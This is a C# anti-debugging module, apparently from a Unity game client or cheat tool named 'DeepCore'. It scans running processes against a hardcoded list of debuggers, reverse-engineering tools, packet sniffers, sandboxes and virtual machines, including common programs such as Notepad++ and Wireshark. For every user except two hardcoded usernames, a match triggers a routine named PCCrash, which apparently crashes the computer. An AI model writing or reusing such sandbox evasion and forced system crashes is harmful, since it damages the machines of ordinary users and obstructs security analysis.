using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using DeepCore.Client.Misc;
using UnityEngine.UI;

namespace DeepCore.Protecc
{
    internal class BaseProtecc
    {
        [DllImport("kernel32.dll")]
        public static extern bool IsDebuggerPresent();
        private static readonly string[] DebuggerProcesses =
        {
            "dnSpy", "ollydbg", "x64dbg", "winDbg", "IDA Pro", "ImmunityDebugger",
            "ProcessHacker", "debugview", "Dbg64", "AspNetRegIIS", "windbg", "SharpDbg", "PEiD",
            "Fiddler", "procexp", "Procmon", "Frida", "Radare2", "JDbg", "Ghidra", "CFF Explorer",
            "Hopper", "Debugger", "AppVerifier", "WinDbgX", "bytecodeviewer", "Arachni", "BurpSuite",
            "Wireshark", "Tcpdump", "IronWASP", "OllyDbg", "x32dbg", "x64dbg", "Notepad++", "MTrace",
            "VeriCode", "VirtualBox","CuckooSandbox", "Sandboxie", "VRTools", "GDB",
            "Valgrind", "FridaServer", "Ltrace", "Radare", "Hades", "Binary Ninja", "Z3"
        };

        static void Main()
        {
            if (IsDebuggerPresent())
            {
                HandleDebuggerDetection();
            }
            if (Debugger.IsAttached)
            {
                HandleDebuggerDetection();
            }
            if (IsDebuggerRunning())
            {
                HandleDebuggerDetection();
            }
        }
        private static bool IsDebuggerRunning()
        {
            var runningProcesses = Process.GetProcesses();
            foreach (var process in runningProcesses)
            {
                if (DebuggerProcesses.Any(debugger => process.ProcessName.StartsWith(debugger, StringComparison.OrdinalIgnoreCase)))
                {
                    return true;
                }
            }
            return false;
        }
        private static void HandleDebuggerDetection()
        {
            if (Environment.UserName == "Biscuit" || Environment.UserName == "david")
            {
                WMessageBox.HandleInternalFailure("I found a debugger :3333", false);
            }
            else
            {
                WMessageBox.HandleInternalFailure("Goodbye :)", false);
                BSODTriggerThings.PCCrash();
            }
        }
    }
}